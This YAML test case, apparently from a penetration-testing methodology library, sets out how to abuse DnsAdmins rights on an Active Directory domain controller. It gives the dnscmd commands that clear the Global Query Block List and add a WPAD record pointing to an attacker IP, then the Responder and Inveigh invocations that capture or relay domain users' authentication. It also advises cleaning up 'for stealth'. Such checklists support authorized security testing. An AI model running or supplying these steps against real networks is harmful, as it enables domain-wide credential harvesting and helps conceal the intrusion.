---
testcase: Exploit DnsAdmins privileges to disable the Global Query Block List, add a malicious WPAD record, and capture hashes or relay authentication
platforms:
  - AD
  - Windows
methodology:
  - BlackBox
  - GreyBox
references:
  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
attack_types:
  - PrivEsc
how-to-test: |
  **Enumeration:**
  1. Confirm membership in the DnsAdmins group:
     - Run: `whoami /groups` or `net group DnsAdmins /DOMAIN`
  2. Verify access to dnscmd or equivalent DNS management rights on a Domain Controller

  **Exploitation:**
  a. Disable the DNS Global Query Block List
     - Clear the block list:
       - `dnscmd <DNS_SERVER> /config /globalqueryblocklist ""`
     - Or remove just the 'WPAD' entry by recreating the list without WPAD.
  b. Add a malicious WPAD DNS record
     - Create a new record pointing WPAD to an attacker-controlled IP:
       - `dnscmd <DNS_SERVER> /recordadd <ZONE_NAME> wpad A <ATTACKER_IP>`
  c. Capture hashes or relay authentication
     - Run Responder or Inveigh on your attack box:
       - For Responder: `python Responder.py -I <Your_Interface>`
       - For Inveigh (PowerShell): `Invoke-Inveigh -NBNS Y -mDNS Y -LLMNR Y -WPAD Y -HTTPAuth Y`
     - Monitor for authentication attempts from domain-joined clients

Key Notes:
  - Disabling the Global Query Block List and publishing malicious DNS records affect all clients in the domain.
  - These actions can lead to widespread credential harvesting.
  - Always restore DNS settings and remove malicious records for stealth.
---